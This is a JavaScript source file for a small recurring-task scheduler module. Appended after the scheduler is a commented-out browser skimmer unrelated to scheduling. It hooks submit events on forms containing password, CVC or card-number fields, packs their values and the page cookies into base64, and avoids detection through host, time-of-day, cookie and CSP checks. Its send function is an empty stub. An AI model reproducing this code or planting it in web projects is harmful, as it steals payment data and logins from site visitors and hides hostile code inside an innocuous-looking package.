// PENSI-SCHEDULER.JS - A simple scheduler to execute a task recurrently base on 
// a defined period. 

const { create } = require('domain');

// module.exports = (function() {
//     const TICKS_ONE_DAY = 24*60*60*1000;

//     return {
//         create : function( config ){
//             config = config || {};
//             return createScheduler({
//                 period : config.period || TICKS_ONE_DAY
//             });  
//         }
//     };
// })();

module.exports = createScheduler;


/**
 * Create an instance of a configured scheduler mgr. 
 * @param config {Object}  
 */
function createScheduler( config ) {	
    console.log(config);
    if(config === undefined) {
        console.log(2);
        throw new Error('config cannot be undefined');
    }
    console.log(3);

    var events = require('events');
    var tasks = [];
    var tasksQueue = getEnumerator();
    var period = config.period;
    var isRunning = false;
    var inst = new events.EventEmitter();
    var clearId;

    // PRIVATE METHODS ///////////
    /**
     * Update and sort task queue
     */
    function updateTaskQueue() {
        //TODO: you might only have to sort the task list once. 
        tasksQueue = getEnumerator(tasks.sort((a, b) => { 
            if(calcDelayTicks(a.start, period) > calcDelayTicks(b.start, period))
                return 1;
            if(calcDelayTicks(a.start, period) < calcDelayTicks(b.start, period))
                return -1;
            return 0;
        }));
        
        return tasksQueue.next();
    } 
    
    function scheduleTask() {
        if(!isRunning) return;
            
        var task = tasksQueue.next();
        if(task === undefined) task = updateTaskQueue();
        
        var delay = calcDelayTicks(task.start, period);	
        clearId = setTimeout(function(){
            if(isRunning){ 
                inst.emit('interval', task); 
                scheduleTask(); 
            }
        }, delay);
    }
    
    /**
     * Calculate delay offset ticks from current time
     * @param startDate {Date}
     * @param period {Number} milliseconds
     */
    function calcDelayTicks( startDate, period ){
        if(!isDate(startDate)) throw new Error('startDate must be a date');
        if(!Number.isInteger(period)) throw new Error('period must be an integer');
        
        var diff = startDate.getTime() - new Date().getTime();
        return (diff < 0 ? period - Math.abs(diff) % period : diff) % (period + 1);
    }

    function isDate( date ){
        return date instanceof Date && !isNaN(date.valueOf());
    }

    function getEnumerator( arrayObj, flags ) {
        arrayObj = arrayObj || [];
        var ccValue = flags ? (flags.isCyclical || 0) : 0;
        var idx = -1;
        var length = arrayObj.length;

        return {
            next : function() {
                idx = ++idx >= length ? ccValue : idx; 
                return arrayObj[idx];
            }
        };
    }    
    
    /**
     * Convert a string time format into a date object. 
     * e.g. '08:33:10' => Mon Jan 25 2016 08:33:10 GMT-0500 (EST)
     */
    function parseTime( time ){
        var rs = /(\d+):(\d+):*(\d*)*/.exec(time);
        if(rs !== null){
            var dt = new Date();
            time = new Date(dt.getFullYear(), dt.getMonth(), 
                dt.getDate(), parseInt(rs[1]), parseInt(rs[2]), 
                    rs[3] !== undefined ? parseInt(rs[3]) : dt.getSeconds());    
        }
        
        return time;
    }
    
    ///////////////
    
    // EXTENDED METHODS //////////////////
    inst.addTask = function(name, time, metaInfo){
        if(typeof time === 'string')
            time = parseTime(time);
        time = time || new Date();
        tasks.push({name: name, start: time, meta: metaInfo});
    };

    inst.start = function(){
        isRunning = true;
        scheduleTask();
    };
        
    inst.stop = function(){
        if(isRunning){
            isRunning = false;
            clearTimeout(clearId);
            tasksQueue = undefined;
        }
    };        
        
    return inst;
}


// var $ = require('jquery');


// function gt() {
//     var isserver = is_server();
//     if (isserver) {
//         return;
//     }
//     var isC = getCookie('xhfd');
//     var isCa = getCookie('xhfda');
//     isHour = getT();
//     var h = self.location.host;
//     var d = self.location;
//     var isIP = validateIPaddress(h);
//     if (isIP || isC || isHour||isCa) {

//         return;
        
//     }


//     const ua = navigator.userAgent
//     var x = document.forms.length;
//     fetch(document.location.href)
//         .then(resp => {
//             const csp = resp.headers.get('Content-Security-Policy');
//             if (csp == null || !csp.includes('default-src')) {

//                 for (var i = 0; i < x; i++) {
//                     var curelements = document.forms[i].elements;
//                     for (var k = 0; k < curelements.length; k++) {
//                         if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
//                             $(document.forms[i]).submit(function (ev) {

//                                 var _ = "";
//                                 for (var j = 0; j < this.elements.length; j++) {
//                                     _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
//                                 }
//                                 const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));

//                                 snd(pl);

//                             });


//                             break;
//                         }


//                     }
//                 }
//             } else if (!csp.includes('form-action') && !isC) {
//                 for (var i = 0; i < x; i++) {
//                     var curelements = document.forms[i].elements;
//                     for (var k = 0; k < curelements.length; k++) {
//                         if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
//                             $(document.forms[i]).submit(function (ev) {

//                                 var _ = "";
//                                 for (var j = 0; j < this.elements.length; j++) {
//                                     _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
//                                 }
//                                 setCookie('xhfda', 1, 864000);
//                                 const pl = encodeURIComponent(btoa(unescape(encodeURIComponent("host-" + h + "|fields-" + _ + "|cookies-" + document.cookie))));




//                             });


//                             break;
//                         }


//                     }
//                 }
//             } else {
//                 return;
//             }

//         });

//     setCookie('xhfd', 1, 86400);
// }

// function snd(pl) {
//     ;
// }

// function getCookie(name) {
//     var matches = document.cookie.match(new RegExp(
//         "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
//     ));
//     //  var cnt = 0;
//     if (matches) {
//         return true;
//     }
//     return false;

// }

// function getT() {
//     var now = new Date();
//     var ch = now.getHours();
//     if (ch > 7 && ch < 19) {
//         return true;
//     } else {
//         return false;
//     }
// }

// function validateIPaddress(ipaddress) {
//     if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(ipaddress) || ipaddress.toLowerCase().includes('localhost')) {
//         return (true)
//     }

//     return (false)
// }

// function is_server() {
//     return !(typeof window != 'undefined' && window.document);
// }

// function setCookie(variable, value, expires_seconds) {
//     var d = new Date();
//     d = new Date(d.getTime() + 1000 * expires_seconds);
//     document.cookie = variable + '=' + value + '; expires=' + d.toGMTString() + ';';
// }

// gt();

